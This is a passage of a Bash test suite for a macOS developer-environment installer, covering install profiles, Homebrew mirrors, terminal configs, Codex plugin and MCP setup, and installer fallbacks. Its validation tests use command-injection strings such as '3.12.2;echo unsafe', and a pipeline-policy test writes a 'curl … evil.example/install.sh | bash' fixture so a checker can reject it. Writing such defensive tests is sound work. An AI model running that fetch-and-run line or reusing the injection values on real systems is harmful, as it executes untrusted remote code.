#!/bin/bash

set -u
set -o pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
MAC_DEV_BOOTSTRAP_TEST=1
export MAC_DEV_BOOTSTRAP_TEST
# shellcheck source=../install.sh
source "$ROOT_DIR/install.sh"

PASS_COUNT=0
FAIL_COUNT=0

pass() {
  PASS_COUNT=$((PASS_COUNT + 1))
  printf '通过：%s\n' "$1"
}

fail() {
  FAIL_COUNT=$((FAIL_COUNT + 1))
  printf '失败：%s\n' "$1" >&2
}

assert_true() {
  local name="$1"
  shift
  if "$@"; then
    pass "$name"
  else
    fail "$name"
  fi
}

assert_contains() {
  local name="$1"
  local haystack="$2"
  local needle="$3"
  if printf '%s\n' "$haystack" | grep -Fqx "$needle"; then
    pass "$name"
  else
    fail "${name}（缺少 ${needle}）"
  fi
}

assert_not_contains() {
  local name="$1"
  local haystack="$2"
  local needle="$3"
  if printf '%s\n' "$haystack" | grep -Fqx "$needle"; then
    fail "${name}（不应包含 ${needle}）"
  else
    pass "$name"
  fi
}

assert_lines_subset() {
  local name="$1"
  local subset="$2"
  local superset="$3"
  local item
  while IFS= read -r item; do
    [[ -n "$item" ]] || continue
    if ! printf '%s\n' "$superset" | grep -Fqx "$item"; then
      fail "${name}（上级档位缺少 ${item}）"
      return
    fi
  done <<< "$subset"
  pass "$name"
}

test_platform_contract() {
  assert_true "支持 Apple Silicon macOS" platform_supported Darwin arm64
  if platform_supported Darwin x86_64; then
    fail "拒绝非 Apple Silicon 环境"
  else
    pass "拒绝非 Apple Silicon 环境"
  fi
}

test_input_validation() {
  assert_true "接受标准 Python 版本" valid_python_version "3.12.2"
  if valid_python_version '3.12.2;echo unsafe'; then
    fail "拒绝异常 Python 版本"
  else
    pass "拒绝异常 Python 版本"
  fi
}

test_install_profile_contract() {
  local original_profile="${INSTALL_PROFILE-}"
  local list
  local item

  assert_true "接受基础安装档位" valid_install_profile basic
  assert_true "接受适中安装档位" valid_install_profile standard
  assert_true "接受完整安装档位" valid_install_profile full
  if valid_install_profile 'standard;echo unsafe'; then
    fail "拒绝异常安装档位"
  else
    pass "拒绝异常安装档位"
  fi

  if [[ "$(profile_from_selection 1 2>/dev/null || true)" == "basic" && \
        "$(profile_from_selection 2 2>/dev/null || true)" == "standard" && \
        "$(profile_from_selection 3 2>/dev/null || true)" == "full" ]]; then
    pass "数字选择映射三个安装档位"
  else
    fail "数字选择映射三个安装档位"
  fi

  INSTALL_PROFILE=""
  if prompt_install_profile <<< "2" >/dev/null 2>&1 && \
    [[ "$INSTALL_PROFILE" == "standard" ]]; then
    pass "交互选择适中安装档位"
  else
    fail "交互选择适中安装档位"
  fi

  INSTALL_PROFILE=""
  unset MAC_DEV_PROFILE
  if resolve_install_profile </dev/null >/dev/null 2>&1 && \
    [[ "$INSTALL_PROFILE" == "basic" ]]; then
    pass "非交互环境默认基础档位"
  else
    fail "非交互环境默认基础档位"
  fi

  INSTALL_PROFILE=""
  MAC_DEV_PROFILE="standard"
  if resolve_install_profile </dev/null >/dev/null 2>&1 && \
    [[ "$INSTALL_PROFILE" == "standard" ]]; then
    pass "环境变量选择适中安装档位"
  else
    fail "环境变量选择适中安装档位"
  fi
  unset MAC_DEV_PROFILE

  INSTALL_PROFILE=""
  if prompt_install_profile <<< $'9\n3' >/dev/null 2>&1 && \
    [[ "$INSTALL_PROFILE" == "full" ]]; then
    pass "交互选择会拒绝无效输入并重试"
  else
    fail "交互选择会拒绝无效输入并重试"
  fi

  if (
    INSTALL_PROFILE=""
    DRY_RUN=0
    parse_args --profile full --dry-run
    [[ "$INSTALL_PROFILE" == "full" && "$DRY_RUN" -eq 1 ]]
  ); then
    pass "命令行参数选择完整安装档位"
  else
    fail "命令行参数选择完整安装档位"
  fi

  if (
    INSTALL_PROFILE=""
    parse_args --profile=standard
    [[ "$INSTALL_PROFILE" == "standard" ]]
  ); then
    pass "等号参数选择适中安装档位"
  else
    fail "等号参数选择适中安装档位"
  fi

  if (
    INSTALL_PROFILE=""
    parse_args --profile >/dev/null 2>&1
  ); then
    fail "拒绝缺少值的安装档位参数"
  else
    pass "拒绝缺少值的安装档位参数"
  fi

  if (
    INSTALL_PROFILE=""
    parse_status=0
    parse_args --doctor --profile standard || parse_status=$?
    [[ "$parse_status" -eq 10 && "$INSTALL_PROFILE" == "standard" ]]
  ); then
    pass "doctor 参数顺序不影响档位选择"
  else
    fail "doctor 参数顺序不影响档位选择"
  fi

  INSTALL_PROFILE="basic"
  list="$(formulae)"
  for item in azure-cli awscli kubernetes-cli docker glab supabase go cloudflared; do
    assert_not_contains "基础档位不含适中 Formula" "$list" "$item"
  done
  assert_contains "基础档位包含 Starship" "$list" "starship"
  assert_not_contains "基础档位不含 OrbStack" "$(casks)" "orbstack"
  assert_not_contains "基础档位不含 Clash Verge" "$(casks)" "clash-verge-rev"
  assert_not_contains "基础档位不含完整档位应用" "$(casks)" "arc"
  assert_contains "基础档位包含 LocalSend" "$(casks)" "localsend"
  assert_contains "基础 doctor 检查 LocalSend 应用" "$(doctor_apps)" "/Applications/LocalSend.app"
  assert_not_contains "基础 doctor 不检查 Azure CLI" "$(doctor_commands)" "az"
  local basic_formulae_list="$list"
  local basic_casks_list
  local basic_extensions_list
  basic_casks_list="$(casks)"
  basic_extensions_list="$(vscode_extensions)"

  INSTALL_PROFILE="standard"
  list="$(formulae)"
  for item in azure-cli awscli kubernetes-cli docker glab supabase go cloudflared; do
    assert_contains "适中档位包含新增 Formula" "$list" "$item"
  done
  assert_contains "适中档位包含 OrbStack" "$(casks)" "orbstack"
  assert_contains "适中档位包含 Clash Verge" "$(casks)" "clash-verge-rev"
  assert_not_contains "适中档位不含完整档位应用" "$(casks)" "arc"
  assert_not_contains "适中档位不含阿里云 CLI" "$list" "aliyun-cli"
  assert_not_contains "适中档位不含 libpq" "$list" "libpq"
  assert_not_contains "适中档位不含 Rustup" "$list" "rustup"
  for item in az aws kubectl docker orb glab supabase go cloudflared; do
    assert_contains "适中 doctor 检查新增命令" "$(doctor_commands)" "$item"
  done
  assert_contains "适中 doctor 检查 OrbStack 应用" "$(doctor_apps)" "/Applications/OrbStack.app"
  for item in chrome-devtools postgres clickhouse; do
    assert_contains "适中档位声明 Codex MCP" "$(codex_mcp_servers)" "$item"
  done
  local standard_formulae_list="$list"
  local standard_casks_list
  local standard_extensions_list
  standard_casks_list="$(casks)"
  standard_extensions_list="$(vscode_extensions)"
  assert_lines_subset "适中 Formula 完整继承基础档位" "$basic_formulae_list" "$standard_formulae_list"
  assert_lines_subset "适中 Cask 完整继承基础档位" "$basic_casks_list" "$standard_casks_list"
  assert_lines_subset "适中扩展完整继承基础档位" "$basic_extensions_list" "$standard_extensions_list"

  INSTALL_PROFILE="full"
  assert_contains "完整档位继承适中 Formula" "$(formulae)" "azure-cli"
  assert_contains "完整档位继承适中 Cask" "$(casks)" "orbstack"
  for item in aliyun-cli libpq rustup; do
    assert_contains "完整档位包含新增 Formula" "$(formulae)" "$item"
  done
  for item in android-commandlinetools android-studio arc thebrowsercompany-dia hapigo betterandbetter typeless vibe-island neteasemusic wechat; do
    assert_contains "完整档位包含新增 Cask" "$(casks)" "$item"
  done
  for item in "/Applications/Xcode.app" "/Applications/iShot Pro.app"; do
    assert_contains "完整档位检查人工 App Store 应用" "$(manual_app_store_apps)" "$item"
  done
  for item in \
    golang.go \
    ms-azuretools.vscode-containers \
    ms-azuretools.vscode-docker \
    redhat.vscode-yaml \
    llvm-vs-code-extensions.lldb-dap \
    llvm-vs-code-extensions.vscode-clangd \
    ms-vscode.cmake-tools \
    ms-vscode.cpp-devtools \
    rust-lang.rust-analyzer \
    swiftlang.swift-vscode \
    vadimcn.vscode-lldb; do
    assert_contains "完整档位包含开发扩展" "$(vscode_extensions)" "$item"
  done
  for item in \
    documents@openai-primary-runtime \
    pdf@openai-primary-runtime \
    spreadsheets@openai-primary-runtime \
    presentations@openai-primary-runtime \
    template-creator@openai-primary-runtime \
    sites@openai-bundled \
    browser@openai-bundled \
    computer-use@openai-bundled \
    visualize@openai-bundled; do
    assert_contains "完整档位包含 Codex 插件" "$(codex_plugins)" "$item"
  done
  for item in larksuite/cli vercel-labs/skills titanwings/colleague-skill mvanhorn/last30days-skill; do
    assert_contains "完整档位包含可重装 Skill 来源" "$(skill_packages)" "$item"
  done
  assert_not_contains "完整档位不包含 OpenCLI" "$(npm_global_packages)" "@jackwener/opencli"
  assert_not_contains "完整档位不包含 Anitime Admin CLI" "$(npm_global_packages)" "@lingjingai/anitime-admin-cli"
  assert_not_contains "完整档位不包含 mas" "$(formulae)" "mas"
  assert_lines_subset "完整 Formula 完整继承适中档位" "$standard_formulae_list" "$(formulae)"
  assert_lines_subset "完整 Cask 完整继承适中档位" "$standard_casks_list" "$(casks)"
  assert_lines_subset "完整扩展完整继承适中档位" "$standard_extensions_list" "$(vscode_extensions)"

  INSTALL_PROFILE="$original_profile"
}

test_homebrew_mirror_contract() {
  assert_true "接受国内 Homebrew 镜像模式" valid_homebrew_mirror "china"
  assert_true "接受 Homebrew 官方源模式" valid_homebrew_mirror "official"
  if valid_homebrew_mirror 'china;echo unsafe'; then
    fail "拒绝异常 Homebrew 镜像模式"
  else
    pass "拒绝异常 Homebrew 镜像模式"
  fi

  local mirror_environment
  if mirror_environment="$({
    unset HOMEBREW_BREW_GIT_REMOTE HOMEBREW_CORE_GIT_REMOTE
    unset HOMEBREW_API_DOMAIN HOMEBREW_BOTTLE_DOMAIN
    export HOMEBREW_NO_INSTALL_FROM_API=1
    configure_homebrew_mirror china
    printf '%s\n' \
      "${HOMEBREW_BREW_GIT_REMOTE-}" \
      "${HOMEBREW_CORE_GIT_REMOTE-}" \
      "${HOMEBREW_API_DOMAIN-}" \
      "${HOMEBREW_BOTTLE_DOMAIN-}" \
      "HOMEBREW_NO_INSTALL_FROM_API=${HOMEBREW_NO_INSTALL_FROM_API-}"
  })"; then
    assert_contains "Brew 仓库使用清华镜像" "$mirror_environment" "https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git"
    assert_contains "Core 仓库使用清华镜像" "$mirror_environment" "https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git"
    assert_contains "Homebrew API 使用中科大镜像" "$mirror_environment" "https://mirrors.ustc.edu.cn/homebrew-bottles/api"
    assert_contains "Homebrew Bottle 使用中科大镜像" "$mirror_environment" "https://mirrors.ustc.edu.cn/homebrew-bottles"
    if printf '%s\n' "$mirror_environment" | grep -Fqx 'HOMEBREW_NO_INSTALL_FROM_API='; then
      pass "国内镜像模式启用 Homebrew API 安装"
    else
      fail "国内镜像模式启用 Homebrew API 安装"
    fi
  else
    fail "国内 Homebrew 镜像环境配置可执行"
  fi

  unset HOMEBREW_BREW_GIT_REMOTE HOMEBREW_CORE_GIT_REMOTE
  unset HOMEBREW_API_DOMAIN HOMEBREW_BOTTLE_DOMAIN
  configure_homebrew_mirror china >/dev/null 2>&1 || true
  if configure_homebrew_mirror official && \
    [[ "${HOMEBREW_BREW_GIT_REMOTE-}" == "https://github.com/Homebrew/brew" && \
       "${HOMEBREW_CORE_GIT_REMOTE-}" == "https://github.com/Homebrew/homebrew-core" && \
       -z "${HOMEBREW_API_DOMAIN-}" && \
       -z "${HOMEBREW_BOTTLE_DOMAIN-}" ]]; then
    pass "官方源模式显式恢复 Homebrew 官方仓库"
  else
    fail "官方源模式显式恢复 Homebrew 官方仓库"
  fi
}

test_homebrew_mirror_installer() {
  local output
  if output="$({
    homebrew_available() { return 1; }
    download_and_run() {
      printf '%s\n' "$2" "${HOMEBREW_BREW_GIT_REMOTE-}" "${HOMEBREW_API_DOMAIN-}"
    }
    load_homebrew() { return 0; }
    configure_homebrew_mirror china
    install_homebrew
  } 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq \
      'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh' && \
    printf '%s\n' "$output" | grep -Fq \
      'https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git' && \
    printf '%s\n' "$output" | grep -Fq \
      'https://mirrors.ustc.edu.cn/homebrew-bottles/api'; then
    pass "Homebrew 官方引导器继承国内镜像配置"
  else
    fail "Homebrew 官方引导器继承国内镜像配置"
  fi
}

test_homebrew_initialization_failure() {
  if (
    homebrew_available() { return 0; }
    load_homebrew() { return 42; }
    install_homebrew >/dev/null 2>&1
  ); then
    fail "已有 Homebrew 初始化失败时停止安装"
  else
    pass "已有 Homebrew 初始化失败时停止安装"
  fi

  if (
    find_homebrew_binary() { printf '/usr/bin/false\n'; }
    load_homebrew >/dev/null 2>&1
  ); then
    fail "brew shellenv 失败码不会被 eval 吞掉"
  else
    pass "brew shellenv 失败码不会被 eval 吞掉"
  fi
}

test_homebrew_mirror_shell_config() {
  local temporary_directory
  local managed_config
  local mirror_block
  local shell_output
  local expected_line
  temporary_directory="$(mktemp -d "${TMPDIR:-/tmp}/mac-dev-bootstrap-test.XXXXXX")"
  managed_config="$temporary_directory/zshrc.zsh"

  if ! write_managed_shell_config "$managed_config"; then
    fail "终端配置持久化 Homebrew 国内镜像"
    command rm -r "$temporary_directory"
    return
  fi

  for expected_line in \
    'HOMEBREW_BREW_GIT_REMOTE="https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git"' \
    'HOMEBREW_CORE_GIT_REMOTE="https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git"' \
    'HOMEBREW_API_DOMAIN="https://mirrors.ustc.edu.cn/homebrew-bottles/api"' \
    'HOMEBREW_BOTTLE_DOMAIN="https://mirrors.ustc.edu.cn/homebrew-bottles"' \
    'unset HOMEBREW_NO_INSTALL_FROM_API'; do
    if grep -Fq "$expected_line" "$managed_config"; then
      pass "终端配置持久化 Homebrew 国内镜像"
    else
      fail "终端配置持久化 Homebrew 国内镜像（缺少 ${expected_line}）"
    fi
  done

  mirror_block="$(sed -n '2,/^esac$/p' "$managed_config")"
  shell_output="$(MAC_DEV_HOMEBREW_MIRROR_BLOCK="$mirror_block" PATH="/usr/bin:/bin" /bin/bash -c '
    print_mirrors() {
      printf "%s:%s|%s|%s|%s\n" "$1" \
        "${HOMEBREW_BREW_GIT_REMOTE-}" \
        "${HOMEBREW_CORE_GIT_REMOTE-}" \
        "${HOMEBREW_API_DOMAIN-}" \
        "${HOMEBREW_BOTTLE_DOMAIN-}"
    }
    eval "$MAC_DEV_HOMEBREW_MIRROR_BLOCK"
    print_mirrors china
    export MAC_DEV_HOMEBREW_MIRROR=official
    eval "$MAC_DEV_HOMEBREW_MIRROR_BLOCK"
    print_mirrors official
    unset MAC_DEV_HOMEBREW_MIRROR
    eval "$MAC_DEV_HOMEBREW_MIRROR_BLOCK"
    print_mirrors china-again
    export MAC_DEV_HOMEBREW_MIRROR=invalid
    eval "$MAC_DEV_HOMEBREW_MIRROR_BLOCK"
    print_mirrors invalid
  ')"

  assert_contains "终端配置可切到 Homebrew 官方源" "$shell_output" \
    "official:https://github.com/Homebrew/brew|https://github.com/Homebrew/homebrew-core||"
  assert_contains "终端配置可恢复 Homebrew 国内镜像" "$shell_output" \
    "china-again:https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git|https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git|https://mirrors.ustc.edu.cn/homebrew-bottles/api|https://mirrors.ustc.edu.cn/homebrew-bottles"
  assert_contains "非法终端镜像模式不会沿用旧镜像" "$shell_output" "invalid:|||"

  command rm -r "$temporary_directory"
}

test_prompt_and_terminal_templates() {
  local temporary_directory
  local managed_environment
  local managed_prompt
  local rendered_starship
  local rendered_ghostty
  temporary_directory="$(mktemp -d "${TMPDIR:-/tmp}/mac-dev-bootstrap-prompt-test.XXXXXX")"
  managed_environment="$temporary_directory/zshrc.zsh"
  managed_prompt="$temporary_directory/prompt.zsh"
  rendered_starship="$temporary_directory/starship.toml"
  rendered_ghostty="$temporary_directory/ghostty.conf"

  write_managed_shell_config "$managed_environment"
  write_managed_prompt_config "$managed_prompt"
  write_starship_config "$rendered_starship"
  write_default_ghostty_config "$rendered_ghostty"

  if grep -Eq 'ZSH_THEME=|oh-my-zsh\\.sh|starship init' "$managed_environment"; then
    fail "环境配置不越权管理提示符"
  else
    pass "环境配置不越权管理提示符"
  fi
  if grep -Fq 'ZSH_THEME=""' "$managed_prompt" && \
    grep -Fq 'oh-my-zsh.sh' "$managed_prompt" && \
    grep -Fq '/opt/homebrew/bin/starship init zsh' "$managed_prompt"; then
    pass "提示符配置由 Oh My Zsh 插件与 Starship 组成"
  else
    fail "提示符配置由 Oh My Zsh 插件与 Starship 组成"
  fi
  if grep -Fq '/opt/homebrew/opt/libpq/bin' "$managed_environment" && \
    grep -Fq '/opt/homebrew/opt/rustup/bin' "$managed_environment" && \
    grep -Fq '$ANDROID_HOME/platform-tools' "$managed_environment" && \
    grep -Fq '.cargo/env' "$managed_environment"; then
    pass "环境配置包含完整档位工具链 PATH"
  else
    fail "环境配置包含完整档位工具链 PATH"
  fi
  if [[ -f "$ROOT_DIR/config/starship.toml" ]] && \
    grep -Fq "palette = 'gruvbox_dark'" "$ROOT_DIR/config/starship.toml"; then
    pass "仓库包含 gruvbox-rainbow Starship 模板"
  else
    fail "仓库包含 gruvbox-rainbow Starship 模板"
  fi
  if [[ -f "$ROOT_DIR/config/ghostty/config" ]] && \
    grep -Fq 'font-family = Maple Mono NF CN' "$ROOT_DIR/config/ghostty/config" && \
    grep -Fq 'theme = Adventure' "$ROOT_DIR/config/ghostty/config"; then
    pass "仓库包含当前 Ghostty 模板"
  else
    fail "仓库包含当前 Ghostty 模板"
  fi
  if cmp -s "$ROOT_DIR/config/starship.toml" "$rendered_starship" && \
    cmp -s "$ROOT_DIR/config/ghostty/config" "$rendered_ghostty"; then
    pass "本地安装使用仓库内终端模板"
  else
    fail "本地安装使用仓库内终端模板"
  fi

  command rm -r "$temporary_directory"
}

test_mcp_plugin_and_skill_install_contract() {
  local temporary_directory
  local helper_dir
  local output
  temporary_directory="$(mktemp -d "${TMPDIR:-/tmp}/mac-dev-bootstrap-ai-test.XXXXXX")"
  helper_dir="$temporary_directory/bin"

  if write_mcp_helper_scripts "$helper_dir" >/dev/null 2>&1 && \
    [[ -x "$helper_dir/chrome-debug" && \
       -x "$helper_dir/mcp-postgres" && \
       -x "$helper_dir/mcp-clickhouse" ]] && \
    /bin/bash -n \
      "$helper_dir/chrome-debug" \
      "$helper_dir/mcp-postgres" \
      "$helper_dir/mcp-clickhouse" && \
    grep -Fq 'chrome-debug-profile' "$helper_dir/chrome-debug" && \
    grep -Fq 'POSTGRES_CONNECTION_STRING' "$helper_dir/mcp-postgres" && \
    grep -Fq 'mcp-clickhouse' "$helper_dir/mcp-clickhouse"; then
    pass "MCP 辅助脚本无密钥且可执行"
  else
    fail "MCP 辅助脚本无密钥且可执行"
  fi

  output="$({
    codex_mcp_registered() { return 1; }
    run_command() { printf '命令：%s\n' "$*"; }
    register_codex_mcp_server chrome-devtools
    register_codex_mcp_server postgres
    register_codex_mcp_server clickhouse
  } 2>&1)"
  if printf '%s\n' "$output" | grep -Fq \
      '命令：codex mcp add chrome-devtools -- chrome-devtools-mcp --browser-url=http://127.0.0.1:9222' && \
    printf '%s\n' "$output" | grep -Fq \
      "命令：codex mcp add postgres -- ${CONFIG_HOME}/bin/mcp-postgres" && \
    printf '%s\n' "$output" | grep -Fq \
      "命令：codex mcp add clickhouse -- ${CONFIG_HOME}/bin/mcp-clickhouse"; then
    pass "Codex MCP 使用无密钥注册命令"
  else
    fail "Codex MCP 使用无密钥注册命令"
  fi

  output="$({
    INSTALL_PROFILE="full"
    codex_plugin_installed() { return 1; }
    codex_plugin_marketplaces_ready() { return 0; }
    command_exists() { return 0; }
    run_command() { printf '命令：%s\n' "$*"; }
    install_codex_plugins
    install_skill_packages
  } 2>&1)"
  if printf '%s\n' "$output" | grep -Fq \
      '命令：codex plugin add --json documents@openai-primary-runtime' && \
    printf '%s\n' "$output" | grep -Fq \
      '命令：npx -y skills add larksuite/cli -g -y' && \
    printf '%s\n' "$output" | grep -Fq \
      '命令：npx -y skills add vercel-labs/skills -g -y --skill find-skills --agent *' && \
    printf '%s\n' "$output" | grep -Fq \
      '命令：npx -y skills add titanwings/colleague-skill -g -y --agent codex' && \
    printf '%s\n' "$output" | grep -Fq \
      '命令：npx -y skills add mvanhorn/last30days-skill -g -y --agent codex'; then
    pass "完整档位使用公开来源安装 Codex 插件与 Skills"
  else
    fail "完整档位使用公开来源安装 Codex 插件与 Skills"
  fi

  if (
    INSTALL_PROFILE="full"
    FAILED_STEPS=()
    command_exists() { return 0; }
    codex_plugin_marketplaces_ready() { return 1; }
    install_codex_plugins >/dev/null 2>&1
    [[ "${#FAILED_STEPS[@]}" -eq 0 ]]
  ); then
    pass "Codex 首次启动前延后插件安装而不误报失败"
  else
    fail "Codex 首次启动前延后插件安装而不误报失败"
  fi

  command rm -r "$temporary_directory"
}

test_full_toolchain_install_contract() {
  local output
  output="$({
    INSTALL_PROFILE="full"
    DRY_RUN=1
    command_exists() { return 0; }
    command() {
      if [[ "$1" == "-v" && "$2" == "rustup" ]]; then
        printf '/opt/homebrew/bin/rustup\n'
      else
        builtin command "$@"
      fi
    }
    android_java_home() { printf '/Applications/Android Studio.app/Contents/jbr/Contents/Home\n'; }
    install_android_sdk
    install_rust_toolchain
  } 2>&1)"
  if printf '%s\n' "$output" | grep -Fq 'platform-tools' && \
    printf '%s\n' "$output" | grep -Fq 'platforms\;android-29' && \
    printf '%s\n' "$output" | grep -Fq 'platforms\;android-36' && \
    printf '%s\n' "$output" | grep -Fq 'system-images\;android-29\;google_apis\;arm64-v8a' && \
    printf '%s\n' "$output" | grep -Fq \
      '[模拟执行] /opt/homebrew/bin/rustup default stable'; then
    pass "完整档位声明 Android SDK 与 Rust stable 安装步骤"
  else
    fail "完整档位声明 Android SDK 与 Rust stable 安装步骤"
  fi
}

test_claude_installer_contract() {
  local output
  if output="$(DRY_RUN=1 run_claude_native_installer 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq \
      'curl -fsSL https://claude.ai/install.sh | bash'; then
    pass "Claude Code 使用官方原生安装命令"
  else
    fail "Claude Code 使用官方原生安装命令"
  fi
}

test_localsend_installer_fallback() {
  local output
  if output="$({
    install_attempt=0
    run_command() {
      install_attempt=$((install_attempt + 1))
      printf '安装命令：%s\n' "$*"
      [[ "$install_attempt" -eq 2 ]]
    }
    install_cask_package localsend
  } 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq \
      '安装命令：brew install --cask localsend' && \
    printf '%s\n' "$output" | grep -Fq \
      '安装命令：env HOMEBREW_ARTIFACT_DOMAIN=https://gh-proxy.com HOMEBREW_ARTIFACT_DOMAIN_NO_FALLBACK=1 brew install --cask --require-sha localsend'; then
    pass "LocalSend 官方源失败后通过镜像重试并强制校验"
  else
    fail "LocalSend 官方源失败后通过镜像重试并强制校验"
  fi

  if (
    run_command() {
      if [[ "$*" == "brew install --cask localsend" ]]; then
        return 1
      fi
      printf '不应执行非法镜像：%s\n' "$*"
      return 0
    }
    MAC_DEV_LOCALSEND_MIRROR='http://mirror.example'
    install_cask_package localsend >/dev/null 2>&1
  ); then
    fail "LocalSend 拒绝非 HTTPS 镜像"
  else
    pass "LocalSend 拒绝非 HTTPS 镜像"
  fi
}

test_claude_installer_fallback() {
  local output
  if output="$({
    fallback_installed=0
    claude_code_available() { [[ "$fallback_installed" -eq 1 ]]; }
    run_claude_native_installer() { return 1; }
    run_command() {
      printf '兜底命令：%s\n' "$*"
      fallback_installed=1
    }
    install_claude_code
  } 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq \
      '兜底命令：brew install --cask claude-code'; then
    pass "Claude 原生安装失败后使用 Homebrew Cask"
  else
    fail "Claude 原生安装失败后使用 Homebrew Cask"
  fi
}

test_claude_installer_verification() {
  local output
  if output="$({
    native_attempted=0
    claude_code_available() { [[ "$native_attempted" -eq 1 ]]; }
    run_claude_native_installer() {
      native_attempted=1
      return 0
    }
    run_command() {
      printf '不应执行兜底：%s\n' "$*"
      return 1
    }
    install_claude_code
  } 2>&1)" && \
    ! printf '%s\n' "$output" | grep -Fq '不应执行兜底'; then
    pass "Claude 原生安装成功并验证后不执行兜底"
  else
    fail "Claude 原生安装成功并验证后不执行兜底"
  fi

  if (
    FAILED_STEPS=()
    claude_code_available() { return 1; }
    run_claude_native_installer() { return 0; }
    run_command() { return 1; }
    install_claude_code >/dev/null 2>&1
  ); then
    fail "Claude 安装器成功但命令不可用时仍判定失败"
  else
    pass "Claude 安装器成功但命令不可用时仍判定失败"
  fi
}

test_tui_contract() {
  local output
  local original_profile="${INSTALL_PROFILE-}"
  local original_tui_mode="${TUI_MODE-auto}"

  TUI_MODE="always"
  assert_true "TUI 可被命令行强制启用" tui_enabled
  TUI_MODE="never"
  if tui_enabled; then
    fail "TUI 可被命令行关闭"
  else
    pass "TUI 可被命令行关闭"
  fi

  TUI_MODE="auto"
  if parse_args --tui && [[ "$TUI_MODE" == "always" ]]; then
    pass "命令行参数可强制启用 TUI"
  else
    fail "命令行参数可强制启用 TUI"
  fi
  TUI_MODE="auto"
  if parse_args --no-tui && [[ "$TUI_MODE" == "never" ]]; then
    pass "命令行参数可禁用 TUI"
  else
    fail "命令行参数可禁用 TUI"
  fi
  TUI_MODE="invalid"
  if parse_args >/dev/null 2>&1; then
    fail "拒绝非法 TUI 模式"
  else
    pass "拒绝非法 TUI 模式"
  fi

  TUI_MODE="always"
  NO_COLOR=1
  TUI_TOTAL_STAGES=4
  TUI_COMPLETED_STAGES=1
  output="$(tui_print_progress "安装 Homebrew" "active")"
  if printf '%s\n' "$output" | grep -Fq '25%' && \
    printf '%s\n' "$output" | grep -Fq '1/4' && \
    printf '%s\n' "$output" | grep -Fq '安装 Homebrew'; then
    pass "TUI 进度条展示百分比与阶段数"
  else
    fail "TUI 进度条展示百分比与阶段数"
  fi

  INSTALL_PROFILE="basic"
  assert_not_contains "基础档位 TUI 不显示完整档专属阶段" \
    "$(install_stage_labels)" "安装 Codex 插件"
  INSTALL_PROFILE="standard"
  assert_contains "适中档位 TUI 显示 MCP 阶段" \
    "$(install_stage_labels)" "配置 Codex MCP"
  INSTALL_PROFILE="full"
  assert_contains "完整档位 TUI 显示插件阶段" \
    "$(install_stage_labels)" "安装 Codex 插件"
  assert_contains "完整档位 TUI 显示人工应用阶段" \
    "$(install_stage_labels)" "检查 App Store 应用"

  INSTALL_PROFILE="basic"
  output="$({
    doctor_commands() {
      printf '%s\n' available-command missing-command
    }
    doctor_apps() {
      printf '%s\n' "/Applications/Available.app" "/Applications/Missing.app"
    }
    command_exists() {
      [[ "$1" == "available-command" ]]
    }
    setup_runtime_paths() { return 0; }
    print_install_inventory
  } 2>&1)"
  if printf '%s\n' "$output" | grep -Fq '已安装 1' && \
    printf '%s\n' "$output" | grep -Fq '未安装 3' && \
    printf '%s\n' "$output" | grep -Fq 'available-command' && \
    printf '%s\n' "$output" | grep -Fq 'missing-command' && \
    printf '%s\n' "$output" | grep -Fq '/Applications/Missing.app'; then
    pass "TUI 安装前清单区分已安装与未安装"
  else
    fail "TUI 安装前清单区分已安装与未安装"
  fi

  output="$({
    TUI_MODE="always"
    NO_COLOR=1
    TUI_TOTAL_STAGES=1
    TUI_COMPLETED_STAGES=0
    FAILED_STEPS=()
    failing_stage() {
      record_failure "模拟安装失败"
      return 0
    }
    run_install_stage "模拟阶段" failing_stage
  } 2>&1)"
  if printf '%s\n' "$output" | grep -Fq '100%' && \
    printf '%s\n' "$output" | grep -Fq '部分失败' && \
    [[ "$(printf '%s\n' "$output" | grep -Fc '模拟阶段')" -ge 2 ]]; then
    pass "TUI 失败阶段仍推进进度并明确标记"
  else
    fail "TUI 失败阶段仍推进进度并明确标记"
  fi

  output="$({
    preflight() { return 0; }
    print_install_inventory() { return 0; }
    configure_homebrew_mirror() { return 0; }
    homebrew_mirror_mode() { printf 'official\n'; }
    install_homebrew() { return 0; }
    install_formulae() { return 0; }
    install_casks() { return 0; }
    configure_terminal_stage() { return 0; }
    install_javascript_stage() { return 0; }
    setup_python() { return 0; }
    install_native_ai_tools() { return 0; }
    install_clickhouse_mcp() { return 0; }
    install_vscode_extensions() { return 0; }
    write_editor_configs() { return 0; }
    doctor() { return 0; }
    INSTALL_PROFILE=""
    FAILED_STEPS=()
    main --profile basic --tui
  } 2>&1)"
  if printf '%s\n' "$output" | grep -Eq '100% +13/13' && \
    printf '%s\n' "$output" | grep -Fq '开发环境安装并验证完成'; then
    pass "基础档位 TUI 完整流程准确到达 100%"
  else
    fail "基础档位 TUI 完整流程准确到达 100%"
  fi

  unset NO_COLOR
  INSTALL_PROFILE="$original_profile"
  TUI_MODE="$original_tui_mode"
}

test_remote_shell_pipeline_policy() {
  local checker="$ROOT_DIR/tests/check_remote_shell_pipelines.sh"
  local temporary_directory
  local fixture

  temporary_directory="$(mktemp -d "${TMPDIR:-/tmp}/mac-dev-bootstrap-pipeline-test.XXXXXX")"
  fixture="$temporary_directory/install.sh"

  printf '%s\n' \
    '#!/bin/bash' \
    "printf '[模拟执行] curl -fsSL https://claude.ai/install.sh | bash\\n'" \
    'curl -fsSL https://claude.ai/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    pass "远程 Shell 管道策略允许唯一官方命令"
  else
    fail "远程 Shell 管道策略允许唯一官方命令"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'printf x; curl -fsSL https://evil.example/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝 printf 前缀绕过"
